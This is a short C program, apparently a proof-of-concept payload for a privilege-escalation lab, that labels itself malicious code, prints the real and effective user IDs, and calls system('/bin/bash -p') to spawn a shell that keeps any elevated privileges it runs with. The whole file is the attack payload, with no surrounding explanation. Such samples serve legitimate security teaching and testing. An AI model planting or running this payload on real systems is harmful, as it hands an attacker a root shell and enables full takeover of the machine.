#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main()
{
    printf("Malicious code executed with UID: %d\n", getuid());
    printf("Effective UID: %d\n", geteuid());
    printf("This could be dangerous if running with root privileges!\n");

    // Demonstrate that we can run any command
    system("/bin/bash -p");

    return 0;
}
